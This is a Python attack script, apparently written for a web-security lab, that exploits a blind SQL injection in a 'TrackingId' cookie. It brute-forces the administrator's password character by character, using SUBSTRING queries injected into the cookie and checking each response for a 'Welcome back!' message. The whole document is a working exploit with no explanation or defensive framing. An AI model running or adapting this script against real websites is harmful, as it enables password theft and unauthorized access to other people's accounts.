#!/usr/bin/python3

import requests, string, sys, time

if len(sys.argv) < 2:
    print("python3 {} <main_url>".format(sys.argv[0]))
    sys.exit(1)

main_url = sys.argv[1]
#s=requests.Session()
password = ""

#r = s.get(main_url)
#cookies = r.cookies.get_dict()
#print(cookies)

chars = string.digits + string.ascii_letters 
index = list(range(1,21))

for index in range(1,21):
    for char in chars:
        sys.stdout.write(f"\r[+] Extracting Password: {password}{char}")
    #   time.sleep(1)

        cookies = {
            "session" : "nbRlpRn5z5y617OEiwWBrIz6fuTdlMMx",
            "TrackingId" : f"V2Aw9at8E5WLtEwv' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),{index},1) = '{char}"
        }

        resp = requests.get(main_url, cookies=cookies)
        if "Welcome back!" in resp.text:
            password += char
            break

    #   print(cookies)

print(f"\n[+] PASS: {password}")
